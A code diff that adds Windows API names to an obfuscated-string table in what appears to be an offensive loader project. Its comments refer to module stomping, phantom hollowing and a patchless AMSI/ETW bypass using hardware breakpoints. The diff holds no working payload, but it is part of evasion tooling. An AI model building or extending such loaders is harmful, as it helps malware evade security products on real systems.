@@ -35,6 +35,7 @@ OBFUSCATED_STRINGS = {
     "XSTR_INTERNET_CRACK_URL_A":    "InternetCrackUrlA",
     "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "XSTR_HTTP_GET":                "GET",
+    "XSTR_HTTP_QUERY_INFO_A":       "HttpQueryInfoA",
     # Stomper.c (sacrificial DLL for module stomping / phantom hollowing)
     "XSTR_STOMP_DLL":               "msftedit.dll",
     # Evasion.c (patchless AMSI/ETW via VEH + hardware breakpoints)
@@ -49,6 +50,13 @@ OBFUSCATED_STRINGS = {
     "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
     "XSTR_KERNEL32_DLL":            "kernel32.dll",
     "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
+    "XSTR_GET_TEMP_PATH_A":         "GetTempPathA",
+    "XSTR_COPY_FILE_A":             "CopyFileA",
+    "XSTR_FIND_FIRST_FILE_A":       "FindFirstFileA",
+    "XSTR_FIND_NEXT_FILE_A":        "FindNextFileA",
+    "XSTR_FIND_CLOSE":              "FindClose",
+    "XSTR_CREATE_FILE_A":           "CreateFileA",
+    "XSTR_DLL_WILDCARD":            "*.dll",
     # Crypt.c (decompression via ntdll)
     "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
 }
